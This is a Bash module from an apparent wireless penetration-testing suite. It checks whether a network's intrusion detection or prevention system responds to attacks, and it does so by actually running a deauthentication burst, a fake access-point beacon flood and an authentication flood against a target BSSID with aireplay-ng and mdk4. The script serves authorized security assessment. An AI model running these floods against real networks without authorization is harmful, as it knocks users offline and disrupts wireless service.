#!/usr/bin/env bash
# MODULE_META
# NAME="WIDS/WIPS Detection"
# CATEGORY="H"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="aireplay-ng,tcpdump,tshark,mdk4"
# DESC="Test if infrastructure detects deauth, fake AP, and auth flood attacks"
# REQS="monitor_iface,target_ssid,target_bssid,target_channel,injection_required"
# PCAP="yes"
# DECODE="wifi_mgmt"

#===============================================================================
#  modules/h1_wids_detection.sh
#  H1: WIDS/WIPS Detection Testing
#
#  PURPOSE:
#    Test if the wireless infrastructure has a Wireless Intrusion Detection
#    and Prevention System (WIDS/WIPS). Perform multiple attack signatures
#    and check if the infrastructure detects, alerts, or takes action.
#
#  TOOLS: ${TOOL_PATHS[mdk4]}, ${TOOL_PATHS[aireplay-ng]}, ${TOOL_PATHS[tcpdump]}
#  PHASE: 2B — Policy Validation
#  DEPENDENCIES: A1 (needs target SSID/BSSID/channel)
#
#  EVIDENCE PRODUCED:
#    - h1_wids_test.txt            (attack log and responses)
#    - h1_response_capture.pcap    (captured WIDS responses)
#    - h1_findings.txt             (analysis summary)
#
#  RESULT JSON FIELDS:
#    - deauth_detected: bool
#    - fake_ap_detected: bool
#    - auth_flood_detected: bool
#    - wids_present: bool
#    - wips_active: bool — did WIPS take containment action?
#    - connectivity_killed: bool — did WIPS kill our port?
#===============================================================================

run_h1() {
    local total_steps=7
    local evidence_prefix="${SESSION_EVIDENCE_DIR}/h1"

    #--- Step 1: Verify tools ---
    log_step 1 $total_steps "Verifying tools"
    update_tc_progress 1 $total_steps "Checking"

    local has_mdk4=false
    local has_aireplay=false

    command -v mdk4 &>/dev/null && has_mdk4=true
    command -v aireplay-ng &>/dev/null && has_aireplay=true

    if [[ "$has_mdk4" == "false" && "$has_aireplay" == "false" ]]; then
        log_error "Either ${TOOL_PATHS[mdk4]} or ${TOOL_PATHS[aireplay-ng]} is required."
        log_error "Install: apt install -y ${TOOL_PATHS[mdk4]} aircrack-ng"
        return 1
    fi

    
    if [[ -z "${GUEST_SSID:-}" || -z "${GUEST_BSSID:-}" ]]; then
        log_error "Target SSID/BSSID not set. Run A1 first."
        return 1
    fi

    log_success "Target: ${GUEST_SSID} (${GUEST_BSSID})"

    #--- Warning banner ---
    echo ""
    echo -e "${C_BG_YELLOW}${C_WHITE}${C_BOLD}"
    echo "  ╔════════════════════════════════════════════════════════════════════╗"
    echo "  ║  WIDS/WIPS DETECTION TEST                                        ║"
    echo "  ║                                                                    ║"
    echo "  ║  This test will perform brief attack signatures to check if       ║"
    echo "  ║  the infrastructure detects and responds to wireless attacks:     ║"
    echo "  ║                                                                    ║"
    echo "  ║    Test 1: Brief deauthentication burst                           ║"
    echo "  ║    Test 2: Fake AP beacon flood                                   ║"
    echo "  ║    Test 3: Authentication flood                                   ║"
    echo "  ║                                                                    ║"
    echo "  ║  Each test is brief and followed by a monitoring period.          ║"
    echo "  ║  WIPS may disconnect or block our adapter.                        ║"
    echo "  ╚════════════════════════════════════════════════════════════════════╝"
    echo -e "${C_RESET}"
    echo ""
    get_or_request_param "confirm" "  Proceed with WIDS/WIPS detection testing? [Y/n]"
    [[ "${confirm,,}" == "n" ]] && return 1

    local deauth_detected="false"
    local fake_ap_detected="false"
    local auth_flood_detected="false"
    local wids_present="false"
    local wips_active="false"
    local connectivity_killed="false"
    local findings_file="${evidence_prefix}_findings.txt"
    local test_log="${evidence_prefix}_wids_test.txt"

    {
        echo "============================================================"
        echo "  H1: WIDS/WIPS Detection Testing"
        echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "  Target: ${GUEST_SSID} (${GUEST_BSSID})"
        echo "============================================================"
        echo ""
    } > "$findings_file"

    {
        echo "============================================================"
        echo "  WIDS/WIPS Attack & Response Log"
        echo "============================================================"
        echo ""
    } > "$test_log"

    #--- Step 2: Enable monitor mode ---
    log_step 2 $total_steps "Enabling monitor mode"
    update_tc_progress 2 $total_steps "Monitor mode"

    enable_monitor_mode || return 1
    local mon_iface="${MONITOR_INTERFACE}"

    # Set channel
    if [[ -n "${GUEST_CHANNEL:-}" ]]; then
        iw dev "$mon_iface" set channel "$GUEST_CHANNEL" 2>/dev/null || true
    fi

    check_abort || return 1

    # Start response monitoring capture
    local response_pcap="${evidence_prefix}_response_capture.pcap"
    ${TOOL_PATHS[tcpdump]} -i "$mon_iface" -w "$response_pcap" \
        "type mgt subtype deauth or type mgt subtype disassoc or type mgt subtype action" \
        &>/dev/null &
    local mon_tcpdump_pid=$!
    register_cleanup "kill -SIGINT $mon_tcpdump_pid 2>/dev/null || true; wait $mon_tcpdump_pid 2>/dev/null || true"

    #--- Helper: Check for WIDS response ---
    _check_wids_response() {
        local test_name="$1"
        local duration=15
        local tmp_pcap="${evidence_prefix}_tmp_check.pcap"
        rm -f "$tmp_pcap"

        # Capture specifically for the response period
        log_info "Monitoring for 15s for ${test_name} response..."
        timeout "$duration" ${TOOL_PATHS[tcpdump]} -i "$mon_iface" -w "$tmp_pcap" \
            "type mgt subtype deauth and wlan addr2 ${GUEST_BSSID}" &>/dev/null || true

        local new_deauths=0
        if command -v tshark &>/dev/null && [[ -f "$tmp_pcap" ]]; then
            ensure_user_ownership "$tmp_pcap"
            local new_deauths=$(run_as_user tshark -r "$tmp_pcap" -n -q -Y "wlan.fc.type_subtype == 0x0c" 2>/dev/null | wc -l) || true
        fi
        local new_deauths=${new_deauths:-0}
        rm -f "$tmp_pcap"

        echo "  ${test_name}: detected_deauths=${new_deauths}" >> "$test_log"

        if [[ $new_deauths -gt 2 ]]; then
            echo "true"
        else
            echo "false"
        fi
    }

    # Baseline deauth count
    local baseline_deauths=0

    #--- Step 3: Test 1 — Deauthentication burst ---
    log_step 3 $total_steps "Test 1: Deauthentication burst"
    update_tc_progress 3 $total_steps "Deauth test"

    check_abort || return 1

    echo "[$(date '+%H:%M:%S')] TEST 1: Deauthentication Burst" >> "$test_log"

    if [[ "$has_aireplay" == "true" ]]; then
        log_cmd "${TOOL_PATHS[aireplay-ng]} --deauth 10 -a ${GUEST_BSSID} ${mon_iface}"
        ${TOOL_PATHS[aireplay-ng]} --deauth 10 -a "$GUEST_BSSID" "$mon_iface" &>/dev/null || true
        echo "  Sent 10 deauth frames via ${TOOL_PATHS[aireplay-ng]}" >> "$test_log"
    elif [[ "$has_mdk4" == "true" ]]; then
        timeout 5 ${TOOL_PATHS[mdk4]} "$mon_iface" d -B "$GUEST_BSSID" -c "${GUEST_CHANNEL:-0}" &>/dev/null || true
        echo "  Sent deauth flood via ${TOOL_PATHS[mdk4]} (5s)" >> "$test_log"
    fi

    local deauth_response
    local deauth_response=$(_check_wids_response "Deauth Detection")

    if [[ "$deauth_response" == "true" ]]; then
        local deauth_detected="true"
        local wids_present="true"
        log_result "SECURE" "Test 1: WIDS detected deauthentication attack!"
        echo "RESULT: WIDS response detected to deauth" >> "$test_log"
    else
        log_info "Test 1: No WIDS response to deauthentication"
        echo "RESULT: No WIDS response to deauth" >> "$test_log"
    fi

    sleep 5  # Cool-down between tests

    #--- Step 4: Test 2 — Fake AP beacon flood ---
    log_step 4 $total_steps "Test 2: Fake AP beacon flood"
    update_tc_progress 4 $total_steps "Fake AP test"

    check_abort || return 1

    echo "" >> "$test_log"
    echo "[$(date '+%H:%M:%S')] TEST 2: Fake AP Beacon Flood" >> "$test_log"

    if [[ "$has_mdk4" == "true" ]]; then
        log_cmd "${TOOL_PATHS[mdk4]} ${mon_iface} b -c ${GUEST_CHANNEL:-1}"

        # Brief beacon flood (10 seconds of fake APs)
        timeout 10 ${TOOL_PATHS[mdk4]} "$mon_iface" b \
            -c "${GUEST_CHANNEL:-1}" \
            -w nta &>/dev/null || true

        echo "  Sent fake AP beacons via ${TOOL_PATHS[mdk4]} (10s)" >> "$test_log"
    else
        log_info "${TOOL_PATHS[mdk4]} not available — skipping beacon flood test"
        echo "  SKIPPED: ${TOOL_PATHS[mdk4]} not available" >> "$test_log"
    fi

    local fake_ap_response
    local fake_ap_response=$(_check_wids_response "Fake AP Detection")

    if [[ "$fake_ap_response" == "true" ]]; then
        local fake_ap_detected="true"
        local wids_present="true"
        log_result "SECURE" "Test 2: WIDS detected fake AP beacon flood!"
        echo "RESULT: WIDS response detected to fake AP" >> "$test_log"
    else
        log_info "Test 2: No WIDS response to fake AP beacons"
        echo "RESULT: No WIDS response to fake AP" >> "$test_log"
    fi

    sleep 5

    #--- Step 5: Test 3 — Authentication flood ---
    log_step 5 $total_steps "Test 3: Authentication flood"
    update_tc_progress 5 $total_steps "Auth flood test"

    check_abort || return 1

    echo "" >> "$test_log"
    echo "[$(date '+%H:%M:%S')] TEST 3: Authentication Flood" >> "$test_log"

    if [[ "$has_mdk4" == "true" ]]; then
        log_cmd "${TOOL_PATHS[mdk4]} ${mon_iface} a -a ${GUEST_BSSID}"

        # Brief auth flood (10 seconds)
        timeout 10 ${TOOL_PATHS[mdk4]} "$mon_iface" a \
            -a "$GUEST_BSSID" &>/dev/null || true

        echo "  Sent auth flood via ${TOOL_PATHS[mdk4]} (10s)" >> "$test_log"
    else
        log_info "${TOOL_PATHS[mdk4]} not available — skipping auth flood test"
        echo "  SKIPPED: ${TOOL_PATHS[mdk4]} not available" >> "$test_log"
    fi

    local auth_response
    local auth_response=$(_check_wids_response "Auth Flood Detection")

    if [[ "$auth_response" == "true" ]]; then
        local auth_flood_detected="true"
        local wids_present="true"
        log_result "SECURE" "Test 3: WIDS detected authentication flood!"
        echo "RESULT: WIDS response detected to auth flood" >> "$test_log"
    else
        log_info "Test 3: No WIDS response to authentication flood"
        echo "RESULT: No WIDS response to auth flood" >> "$test_log"
    fi

    # Stop monitoring capture
    
    validate_pcap "$response_pcap" "WIDS response monitoring capture"

    #--- Step 6: Check if WIPS took containment action ---
    log_step 6 $total_steps "Checking for WIPS containment"
    update_tc_progress 6 $total_steps "WIPS check"

    # Restore managed mode first
    disable_monitor_mode
    sleep 5

    # Check if we can still connect
    local can_connect="true"
    if [[ -n "${GATEWAY_IP:-}" ]]; then
        if ! ping -c 2 -W 3 "$GATEWAY_IP" &>/dev/null; then
            local can_connect="false"
            local connectivity_killed="true"
            local wips_active="true"
            local wids_present="true"
            log_result "SECURE" "WIPS appears to have blocked our port/MAC — connectivity lost!"
            echo "" >> "$test_log"
            echo "WIPS CONTAINMENT: Connectivity killed after attacks" >> "$test_log"
        else
            log_info "Still connected — WIPS did not block us"
        fi
    fi

    #--- Step 7: Save results ---
    log_step 7 $total_steps "Saving results"
    update_tc_progress 7 $total_steps "Saving"

    local detection_count=0
    [[ "$deauth_detected" == "true" ]] && ((detection_count++))
    [[ "$fake_ap_detected" == "true" ]] && ((detection_count++))
    [[ "$auth_flood_detected" == "true" ]] && ((detection_count++))

    # Write findings summary
    {
        echo ""
        echo "Summary:"
        echo "  Deauth attack detected by WIDS:     ${deauth_detected}"
        echo "  Fake AP flood detected by WIDS:     ${fake_ap_detected}"
        echo "  Auth flood detected by WIDS:        ${auth_flood_detected}"
        echo "  WIDS/WIPS present:                  ${wids_present}"
        echo "  WIPS containment (port blocked):    ${wips_active}"
        echo "  Connectivity killed:                ${connectivity_killed}"
        echo "  Detection rate:                     ${detection_count}/3 tests"
    } >> "$findings_file"

    local result_status="INFO"
    local result_summary=""
    local recommendations=""

    if [[ "$wips_active" == "true" ]]; then
        local result_status="SECURE"
        local result_summary="WIDS/WIPS is active and took containment action. ${detection_count}/3 attack signatures were detected. WIPS blocked our connectivity after attacks."
        local recommendations="WIDS/WIPS is working effectively. Continue regular system health monitoring."
    elif [[ "$wids_present" == "true" ]]; then
        local result_status="SECURE"
        local result_summary="WIDS detected ${detection_count}/3 attack signatures. However, no active containment (WIPS) was observed."
        local recommendations="1) Verify WIDS alerts are being monitored by SOC/NOC. "
        recommendations+="2) Consider enabling WIPS auto-containment for detected threats. "
        recommendations+="3) Review WIDS sensitivity settings for undetected attacks."
    else
        local result_status="INFO"
        local result_summary="No WIDS/WIPS detection was observed for any of the 3 attack tests. The wireless infrastructure does not appear to have active wireless intrusion detection."
        local recommendations="1) Deploy a Wireless Intrusion Detection System (WIDS). "
        recommendations+="2) Enterprise solutions: Cisco Adaptive wIPS, Aruba RFProtect, Meraki Air Marshal. "
        recommendations+="3) Open-source alternative: OpenWIPS-ng. "
        recommendations+="4) Configure alerts for: deauth floods, rogue APs, auth floods, MAC spoofing."
    fi

    local result_json
    evidence_register_file "h1_wids_test.txt"
    evidence_register_file "h1_response_capture.pcap"
    evidence_register_file "h1_findings.txt"

    local result_json=$(run_tool jq -n \
        --arg status "$result_status" \
        --arg summary "$result_summary" \
        --arg details "Detected: deauth=${deauth_detected}, fake_ap=${fake_ap_detected}, auth_flood=${auth_flood_detected}. WIDS=${wids_present}, WIPS=${wips_active}" \
        --arg recommendations "$recommendations" \
        --arg deauth_detected "$deauth_detected" \
        --arg fake_ap_detected "$fake_ap_detected" \
        --arg auth_flood_detected "$auth_flood_detected" \
        --arg wids_present "$wids_present" \
        --arg wips_active "$wips_active" \
        --arg connectivity_killed "$connectivity_killed" \
        --argjson detection_count "$detection_count" \
        '{
            status: $status,
            summary: $summary,
            details: $details,
            recommendations: $recommendations,
            deauth_detected: ($deauth_detected == "true"),
            fake_ap_detected: ($fake_ap_detected == "true"),
            auth_flood_detected: ($auth_flood_detected == "true"),
            wids_present: ($wids_present == "true"),
            wips_active: ($wips_active == "true"),
            connectivity_killed: ($connectivity_killed == "true"),
            detection_count: $detection_count,
                    }')

    save_tc_result "H1" "$result_json" "has_tool_output:1,clean_run:1"

    # Display summary
    echo ""
    if [[ "$wips_active" == "true" ]]; then
        log_result "SECURE" "★ WIDS/WIPS active — containment observed (${detection_count}/3 detected)"
    elif [[ "$wids_present" == "true" ]]; then
        log_result "SECURE" "WIDS detected ${detection_count}/3 attack signatures (no active containment)"
    else
        log_result "INFO" "No WIDS/WIPS detection observed — 0/3 attacks detected"
    fi

    return 0
}
